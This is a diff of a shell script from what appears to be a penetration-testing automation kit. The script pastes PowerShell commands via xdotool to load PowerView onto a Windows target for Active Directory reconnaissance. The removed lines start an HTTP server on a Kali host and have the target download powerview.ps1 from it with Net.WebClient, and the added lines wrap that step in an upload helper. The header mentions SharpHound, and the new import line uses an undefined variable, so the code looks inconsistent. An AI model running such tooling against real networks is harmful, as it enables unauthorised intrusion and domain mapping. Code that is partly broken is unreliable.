@@ -4,31 +4,10 @@
 ps: Upload sharphound and execute
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+LOCATION="${SCRIPTS_DIR}/windows/activeDirectroy/powerVIew/.files"
+FILE="powerview.ps1"
 
-# Generate gui form
-generate_form "Port"
+ps_webclient_upload_file "${LOCATION}" "${FILE}"
 
-PORT=${form_data["Port"]}
-
-cd ${SCRIPTS_DIR}/windows/activeDirectroy/powerVIew/.files
-python3 -m http.server ${PORT} &
-HTTP_PID=$!
-
-TMP_FOLDER="C:\temp"
-
-paste_command "New-Item -Path \"c:\\\" -Name "temp" -ItemType \"directory\""
+paste_command "Import-Module ${FILE_LOCATION}"
 xdotool key Return
-sleep 0.8
-
-paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/powerview.ps1', '${TMP_FOLDER}\powerview.ps1')"
-xdotool key Return
-sleep 3
-
-paste_command "Import-Module ${TMP_FOLDER}\powerview.ps1"
-xdotool key Return
-
-sleep 60
-kill $HTTP_PID
